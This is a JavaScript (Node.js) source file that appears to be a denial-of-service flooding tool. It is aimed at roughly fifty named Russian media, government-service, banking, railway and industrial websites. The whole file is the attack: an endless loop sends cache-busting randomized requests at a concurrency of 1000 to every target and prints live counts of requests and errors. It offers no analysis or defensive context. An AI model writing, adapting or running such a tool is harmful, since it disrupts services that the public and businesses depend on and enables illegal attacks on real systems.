
import fetch from "node-fetch";

const opts = { number_of_requests: 0, number_of_errored_responses: 0 };
const targets = {
  'https://lenta.ru/': {...opts},
  'https://ria.ru/': {...opts},
  'https://ria.ru/lenta/': {...opts},
  'https://www.rbc.ru/': {...opts},
  'https://www.rt.com/': {...opts},
  'http://kremlin.ru/': {...opts},
  'http://en.kremlin.ru/': {...opts},
  'https://smotrim.ru/': {...opts},
  'https://tass.ru/': {...opts},
  'https://tvzvezda.ru/': {...opts},
  'https://vsoloviev.ru/': {...opts},
  'https://www.1tv.ru/': {...opts},
  'https://www.vesti.ru/': {...opts},
  'https://online.sberbank.ru/': {...opts},
  'https://sberbank.ru/': {...opts},
  'https://zakupki.gov.ru/': {...opts},
  'https://www.gosuslugi.ru/': {...opts},
  'https://er.ru/': {...opts},
  'https://www.rzd.ru/': {...opts},
  'https://rzdlog.ru/': {...opts},
  'https://vgtrk.ru/': {...opts},
  'https://www.interfax.ru/': {...opts},
  'https://www.mos.ru/uslugi/': {...opts},
  'http://government.ru/': {...opts},
  'https://mil.ru/': {...opts},
  'https://www.nalog.gov.ru/': {...opts},
  'https://customs.gov.ru/': {...opts},
  'https://pfr.gov.ru/': {...opts},
  'https://rkn.gov.ru/': {...opts},
  'https://www.gazprombank.ru/': {...opts},
  'https://www.vtb.ru/': {...opts},
  'https://www.gazprom.ru/': {...opts},
  'https://lukoil.ru/': {...opts},
  'https://magnit.ru/': {...opts},
  'https://www.nornickel.com/': {...opts},
  'https://www.surgutneftegas.ru/': {...opts},
  'https://www.tatneft.ru/': {...opts},
  'https://www.evraz.com/ru/': {...opts},
  'https://nlmk.com/': {...opts},
  'https://www.sibur.ru/': {...opts},
  'https://www.severstal.com/': {...opts},
  'https://www.metalloinvest.com/': {...opts},
  'https://nangs.org/': {...opts},
  'https://rmk-group.ru/ru/': {...opts},
  'https://www.tmk-group.ru/': {...opts},
  'https://ya.ru/': {...opts},
  'https://www.polymetalinternational.com/ru/': {...opts},
  'https://www.eurosib.ru/': {...opts},
  'https://ugmk.ua/': {...opts},
  'https://omk.ru/': {...opts}
}

const printStats = () => {
  process.stdout.write("\u001b[3J\u001b[2J\u001b[1J");
  console.log(targets);
}
setInterval(printStats, 1000);

const CONCURRENCY_LIMIT = 1000
const queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
  });
}

const flood = async (target) => {
  for (let i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    const rand = i % 13 === 0 ? '' : ('?' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 2500 })
        .catch((error) => {
          console.log(error);
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText;
          }
          targets[target].number_of_requests++;
        })
    )
  }
}

// Start
Object.keys(targets).map(flood);